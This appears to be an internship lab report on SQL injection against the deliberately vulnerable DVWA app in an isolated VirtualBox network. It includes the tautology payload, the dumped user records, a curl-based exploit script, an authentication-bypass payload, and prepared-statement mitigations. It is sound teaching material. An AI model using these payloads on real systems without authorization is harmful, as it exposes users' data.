# Task 3: SQL Injection on DVWA (Low Security)

## Internship: Oasis Infobyte — Security Analyst Internship
**Level:** Beginner  
**Tool Used:** DVWA (Damn Vulnerable Web Application) v1.0.7 

---

## Objective

Demonstrate an SQL Injection vulnerability on DVWA with the security level set to low, capture the output, and explain the vulnerability.

---

## Lab Environment

| Component        | Details                              |
|-----------------|--------------------------------------|
| Attacker Machine | Kali Linux                          |
| Target IP        | 192.168.56.101                      |
| Target URL       | http://192.168.56.101/dvwa/vulnerabilities/sqli/ |
| Application      | DVWA v1.0.7                         |
| Security Level   | Low                                 |
| Logged in as     | admin                               |
| PHPIDS           | Disabled                            |
| Network Type     | Host-Only Network (VirtualBox)      |

---

## Steps Performed

### Step 1: Set DVWA Security Level to Low

Navigated to `http://192.168.56.101/dvwa/security.php` and confirmed Security Level is set to **low**.

```
Security level set to low
```

This disables all input sanitization and security controls, making the application fully vulnerable to SQL injection.

---

### Step 2: Test Normal Input (ID = 1)

Entered `1` in the User ID field and submitted.

**URL:** `http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#`

**Result:**
```
ID: 1
First name: admin
Surname: admin
```

Normal behavior confirmed — the application queries the database using the `id` parameter directly and returns a single user record.

---

### Step 3: Inject SQL Payload

Entered the following payload in the User ID input field:

```
1' OR '1'='1
```

**URL:** `http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit#`

---

### Step 4: Observe the Result

**All 5 user records were returned from the database:**

```
ID: 1' OR '1'='1  | First name: admin   | Surname: admin
ID: 1' OR '1'='1  | First name: Gordon  | Surname: Brown
ID: 1' OR '1'='1  | First name: Hack    | Surname: Me
ID: 1' OR '1'='1  | First name: Pablo   | Surname: Picasso
ID: 1' OR '1'='1  | First name: Bob     | Surname: Smith
```

The SQL injection was successful — all records in the `users` table were exposed.

---

## How the Attack Works

### Vulnerable PHP Code (Backend)
```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

The `$id` parameter is taken directly from user input with no sanitization and inserted into the SQL query as-is.

### What the Injected Query Becomes

When the payload `1' OR '1'='1` is submitted, the full SQL query executed by the server becomes:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

The condition `'1'='1'` is **always true**, which causes the `WHERE` clause to match every row in the table — returning all user records instead of just one.

---

## Exploit Script

The `sql_injection_exploit.sh` script automates the same attack using `curl`:

```bash
#!/bin/bash

# Simple SQL Injection demonstration for DVWA

TARGET="http://localhost/DVWA/vulnerabilities/sqli/?id=1'%20OR%20'1'='1&Submit=Submit#"

echo "Performing SQL Injection attack on DVWA..."

curl -s "$TARGET"

echo "If the application is vulnerable, it will return multiple user records."
```

**Usage:**
```bash
chmod +x sql_injection_exploit.sh
./sql_injection_exploit.sh
```

---

## Vulnerability Explanation

SQL Injection (SQLi) is listed as **OWASP Top 10 — A03:2021 Injection**. It occurs when:

1. User-supplied input is directly embedded into a SQL query
2. The input is not validated, sanitized, or parameterized
3. The attacker injects SQL syntax that modifies the query's logic

In this case, the single quote `'` closes the original string literal, and `OR '1'='1` appends a condition that is always true — bypassing the intended `WHERE` filter entirely.

---

## Impact

| Impact | Description |
|--------|-------------|
| Data Exposure | All user records returned without authorization |
| Authentication Bypass | Login can be bypassed using `' OR '1'='1'-- -` |
| Database Enumeration | UNION attacks can extract table names, version, credentials |
| Privilege Escalation | Advanced payloads can lead to OS-level access |

---

## Mitigation

SQL Injection is fully preventable with proper coding practices:

**1. Prepared Statements (Parameterized Queries) — PRIMARY FIX**
```php
// Vulnerable
$query = "SELECT * FROM users WHERE user_id = '$id'";

// Secure
$stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

**2. Input Validation**
```php
if (!is_numeric($id)) {
    die("Invalid input.");
}
```

**3. Least Privilege Database Accounts**
The database user should only have SELECT access on required tables — never admin privileges.

**4. Web Application Firewall (WAF)**
Deploy a WAF to detect and block common SQLi patterns.

**5. Disable Detailed Error Messages**
Never expose raw database errors to end users.

---

## Screenshots

| Screenshot | Description |
|-----------|-------------|
| `Screenshot_2026-03-12_16_50_44.png` | DVWA Security level set to low |
| `Screenshot_2026-03-12_16_51_25.png` | Normal query — ID 1 returns admin/admin |
| `Screenshot_2026-03-12_17_04_54.png` | Payload `1' OR '1'='1` entered in input |
| `Screenshot_2026-03-12_17_04_15.png` | All 5 users dumped from database |

---

## Repository Structure

```
Task3_SQL_Injection/
├── sql_injection_exploit.sh   # curl-based exploit script
├── screenshots/
│   ├── Screenshot_2026-03-12_16_50_44.png  # Security level low
│   ├── Screenshot_2026-03-12_16_51_25.png  # Normal query result
│   ├── Screenshot_2026-03-12_17_04_54.png  # Payload input
│   └── Screenshot_2026-03-12_17_04_15.png  # All users dumped
└── README.md                  # This report
```

---

## Disclaimer

This SQL injection was performed on DVWA — an intentionally vulnerable web application — in a controlled lab environment on a Host-Only VirtualBox network, solely for educational purposes as part of the Oasis Infobyte Security Analyst Internship. Performing SQL injection on systems without explicit authorization is illegal.
